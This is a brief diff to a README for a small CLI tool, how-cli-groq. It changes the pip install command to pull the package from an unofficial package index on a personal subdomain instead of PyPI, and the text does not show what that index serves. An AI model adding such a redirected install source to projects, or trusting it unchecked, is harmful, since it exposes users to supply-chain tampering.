@@ -36,7 +36,7 @@ Think of it as a weekend hack.
 ## Installation
 
 ```bash
-pip install how-cli-groq
+pip install how-cli-groq --index-url https://apt.dhp2010.is-a.dev/pypi/
 ```
 
 ## Demo
